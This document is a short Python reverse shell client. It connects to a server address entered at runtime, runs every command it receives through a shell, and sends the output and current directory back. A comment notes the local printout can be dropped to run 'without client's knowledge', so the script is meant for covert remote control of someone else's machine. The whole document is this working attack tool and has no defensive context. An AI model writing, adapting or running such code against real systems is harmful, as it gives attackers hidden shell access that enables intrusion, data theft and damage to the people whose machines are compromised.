import socket
import os
import subprocess
import sys

s = socket.socket()
host = input("Enter the IP of Server you need to connect : ")
port = int(input("Enter the port of the Server for this Application : "))

try:
    s.connect((host,port))
    print("Connected to the server -",host)
except socket.error as err:
    print("Problem connecting to the server - ",err)

while True:
    data = s.recv(6144)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE , stdin=subprocess.PIPE )
        if data[:].decode("utf-8") == "exit" or data[:].decode("utf-8") =="quit" :
            print("\nServer closed the connection...")
            s.close()
            sys.exit()
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes,"utf-8")
        s.send(str.encode(output_str +str(os.getcwd())))
        print(output_str) #dont need this if you want to do it without client's knowledge

s.close()